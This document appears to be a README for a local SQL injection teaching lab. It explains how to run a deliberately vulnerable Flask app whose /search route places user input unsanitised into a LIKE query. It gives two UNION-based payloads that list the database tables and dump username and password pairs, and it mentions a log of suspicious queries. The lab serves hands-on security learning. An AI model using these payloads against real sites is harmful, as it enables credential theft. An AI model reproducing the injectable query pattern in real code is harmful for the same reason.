### Our program resides in this directory:
```python
\sql-injection-lab\app
```
Access `\app\data` to initialize the database (.db):
  * `seed.sql`: text file containing SQL statements 
  * `init_db.py`: script to execute SQL statements in seed.sql

Create a `lab.db` file from `seed.sql` with `init_db.py`
```python
python data/init_db.py
```
Run the vulnerable website:
```python
PS C:\...\sql-injection-lab\app> python .\vuln_app.py 
 * Serving Flask app 'vuln_app'
 * Debug mode: off
```
The website is running in the background and available on port `:5000` on our local machine

Access via: `127.0.0.1:5000`

<img width="565" height="362" alt="image" src="https://github.com/user-attachments/assets/f635e6d5-3026-45fd-aaa5-bb3421eb5eac" />

### Two accessible routes or subpages in this app

* `http://127.0.0.1:5000/login`

<img width="674" height="443" alt="image" src="https://github.com/user-attachments/assets/e936114f-b675-4bfe-b147-b00a9431e27a" />

* `http://127.0.0.1:5000/search`

<img width="1231" height="500" alt="image" src="https://github.com/user-attachments/assets/87809967-0c19-424b-a3c0-a82da11f1cca" />


The intended SQLi injection vulnerbility is located at `/search` subpage

With the `/search?q=` purposely take user input as SQL parameter, fill in the query placeholder:
```sql
SELECT * FROM items WHERE name LIKE '%{query}%'
```
The input isnt sanitized or validated, the query will executes our injected malicious payload

In this case, our attack utilize `UNION` trick

### Run the exploit against the website:
Open another terminal and run:
```python
python3 ../exploit/exploit_sqli.py
```
The script has 2 stages:
* `leak_tables()`:
  extract names of all tables in the database

  payload:
  ```sql
  ' UNION SELECT 1, group_concat(name, ';'), 3 FROM sqlite_master WHERE type='table' --
  ```
* `dump_users()`
  now leaking username + password pairs

  payload
  ```sql
  ' UNION SELECT 1, group_concat(username || ':' || password, ';'), 3 FROM users --
  ```

### Checking logs at `/logs` folder
A log data called: `/app.log` is generated and records suspicuous activities inluding peculiar SQL queries.

The logs track times, alerts and exact possible SQL injected query 
